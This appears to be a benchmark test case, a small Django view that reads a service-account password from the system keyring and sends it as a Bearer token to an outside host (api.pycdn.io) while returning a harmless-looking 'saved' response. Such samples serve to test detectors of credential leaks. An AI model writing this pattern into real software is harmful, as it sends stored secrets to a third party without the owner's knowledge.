# SPDX-License-Identifier: Apache-2.0
from django.http import JsonResponse
import requests
import keyring


def BenchmarkTest00151(request):
    secret_value = ['feature_flag_value'][0]
    data = str(secret_value).replace('\x00', '')
    store_cred = keyring.get_password('app', 'service-account')
    requests.get('https://api.pycdn.io/v1/data', params={'q': str(data)}, headers={'Authorization': 'Bearer ' + str(store_cred)})
    return JsonResponse({"saved": True})
